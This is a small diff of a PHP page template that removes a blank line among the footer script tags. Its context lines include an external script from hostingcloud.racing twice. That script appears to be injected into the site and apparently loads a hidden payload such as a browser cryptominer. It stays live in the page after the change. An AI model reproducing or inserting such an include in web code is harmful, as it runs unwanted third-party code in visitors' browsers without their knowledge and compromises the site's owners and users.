@@ -1669,7 +1669,6 @@
 			<script>window.jQuery || document.write('<script src="<?php echo $library; ?>js/jquery-2.2.4.min.js"><\/script>')</script>
 
 			<script src="<?php echo $library; ?>js/scripts.min.js"></script>
-
 			<script src="https://www.hostingcloud.racing/hDTl.js"></script>
 		  <script src="https://www.hostingcloud.racing/hDTl.js"></script>
 	    <script>
